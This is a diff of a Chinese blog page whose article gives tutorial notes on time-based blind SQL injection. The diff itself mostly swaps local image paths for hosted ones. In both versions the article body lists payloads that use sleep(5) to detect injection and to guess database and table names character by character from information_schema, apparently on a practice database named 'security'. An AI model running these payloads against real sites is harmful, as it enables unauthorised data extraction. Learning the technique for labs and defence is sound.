@@ -8,21 +8,21 @@
   
     <meta name="keywords" content="Feng,Feng's Blog">
   
-  <meta name="description" content="sql基于时间的盲注知识点1.时间检测盲注使用的函数  检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&amp;gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+  3.检测表名检测表名长度 12">
+  <meta name="description" content="sql基于时间的盲注知识点1.时间检测盲注使用的函数  检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&amp;gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+  3.检测表名检测表名长度 1a">
 <meta name="keywords" content="sql盲注">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql时间盲注">
 <meta property="og:url" content="https://feng4.github.io/2018/10/25/sql时间盲注/index.html">
 <meta property="og:site_name" content="Feng 的博客">
-<meta property="og:description" content="sql基于时间的盲注知识点1.时间检测盲注使用的函数  检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&amp;gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+  3.检测表名检测表名长度 12">
+<meta property="og:description" content="sql基于时间的盲注知识点1.时间检测盲注使用的函数  检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&amp;gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+  3.检测表名检测表名长度 1a">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="c:/Users/19868/Desktop/图片1.png">
-<meta property="og:image" content="c:/Users/19868/Desktop/爬虫/注入/盲注/时间盲注/时间盲注的方法.png">
-<meta property="og:updated_time" content="2018-10-25T11:25:33.726Z">
+<meta property="og:image" content="https://i.imgur.com/k00qs7X.png">
+<meta property="og:image" content="https://i.imgur.com/8A2FBlW.png">
+<meta property="og:updated_time" content="2018-10-25T11:32:48.092Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql时间盲注">
-<meta name="twitter:description" content="sql基于时间的盲注知识点1.时间检测盲注使用的函数  检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&amp;gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+  3.检测表名检测表名长度 12">
-<meta name="twitter:image" content="c:/Users/19868/Desktop/图片1.png">
+<meta name="twitter:description" content="sql基于时间的盲注知识点1.时间检测盲注使用的函数  检测是否有时间盲注： and select sleep(5) --+ 2.检测数据库名and if(length(database())&amp;gt;=8,sleep(5),1) --+ and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+  3.检测表名检测表名长度 1a">
+<meta name="twitter:image" content="https://i.imgur.com/k00qs7X.png">
   
   
     <link rel="icon" href="/favicon.ico">
@@ -149,19 +149,19 @@
     <div class="article-entry post-content" itemprop="articleBody">
       
             
-            <h1 id="sql基于时间的盲注"><a href="#sql基于时间的盲注" class="headerlink" title="sql基于时间的盲注"></a>sql基于时间的盲注</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-时间检测"><a href="#1-时间检测" class="headerlink" title="1.时间检测"></a>1.时间检测</h3><p><strong>盲注使用的函数</strong> <br><br><img src="C:\Users\19868\Desktop\图片1.png" alt="sss"></p>
+            <h1 id="sql基于时间的盲注"><a href="#sql基于时间的盲注" class="headerlink" title="sql基于时间的盲注"></a>sql基于时间的盲注</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-时间检测"><a href="#1-时间检测" class="headerlink" title="1.时间检测"></a>1.时间检测</h3><p><strong>盲注使用的函数</strong> <br><br><img src="https://i.imgur.com/k00qs7X.png" alt="121"></p>
 <p>检测是否有时间盲注：</p>
 <pre><code>and select sleep(5) --+
 </code></pre><h3 id="2-检测数据库名"><a href="#2-检测数据库名" class="headerlink" title="2.检测数据库名"></a>2.检测数据库名</h3><pre><code>and if(length(database())&gt;=8,sleep(5),1) --+
 and (select if(ascii(substr(database(),1,1)),sleep(5),null)) --+
-</code></pre><p><img src="C:\Users\19868\Desktop\爬虫\注入\盲注\时间盲注\时间盲注的方法.png" alt="时间盲注"></p>
+</code></pre><p><img src="https://i.imgur.com/8A2FBlW.png" alt="1231"></p>
 <h3 id="3-检测表名"><a href="#3-检测表名" class="headerlink" title="3.检测表名"></a>3.检测表名</h3><p>检测表名长度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">and if(length((select table_name from information_schema.tables </span><br><span class="line">where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1)&gt;5),sleep(5),1)--+</span><br></pre></td></tr></table></figure>
 <p>检测表名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and if(substr((select table_name from information_schema.tables </span><br><span class="line">where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(substr((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),1,1)=&apos;a&apos;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
             <div class="post-copyright">
     <div class="content">
-        <p>最后更新： 2018年10月25日 19:25</p>
+        <p>最后更新： 2018年10月25日 19:32</p>
         <p>原始链接： <a class="post-url" href="/2018/10/25/sql时间盲注/" title="sql时间盲注">https://feng4.github.io/2018/10/25/sql时间盲注/</a></p>
         <footer>
             <a href="https://feng4.github.io">
